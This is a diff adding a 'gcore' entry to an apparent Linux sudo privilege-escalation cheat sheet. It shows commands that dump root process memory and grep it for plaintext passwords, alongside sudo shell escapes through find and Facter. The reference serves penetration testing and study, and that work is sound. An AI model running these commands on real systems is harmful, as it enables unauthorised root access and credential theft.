@@ -819,6 +819,37 @@ sudo /usr/bin/find . -exec /bin/bash \; -quit
 sudo /find /bin -name nano -exec /bin/sh \;
 ```
 
+### gcore
+
+If `sudo -l` allows `gcore`, dump process memory for root-owned processes and search for credentials. This is especially useful against long-running helper processes that keep passwords in memory.
+
+```bash
+sudo -l
+# (ALL) NOPASSWD: /usr/bin/gcore
+
+ps -elf | grep root
+sudo /usr/bin/gcore PID
+```
+
+Find and inspect the core file:
+
+```bash
+find / -type f -name "core.PID" 2>/dev/null
+strings core.PID | less
+```
+
+Example target:
+
+```bash
+ps -elf | grep password
+# root ... /usr/bin/password-store
+
+sudo /usr/bin/gcore PID
+strings core.PID | grep -i "password\|root"
+```
+
+If a plaintext root password appears, try `su root`.
+
 ### Facter (Puppet)
 
 If you can run `sudo /usr/bin/facter` (e.g. `(ALL) NOPASSWD: /usr/bin/facter`), use `--custom-dir` to load a directory containing Ruby code; Facter will execute custom facts as root. Write a Ruby script that runs a shell or bind shell, then point facter at its directory.
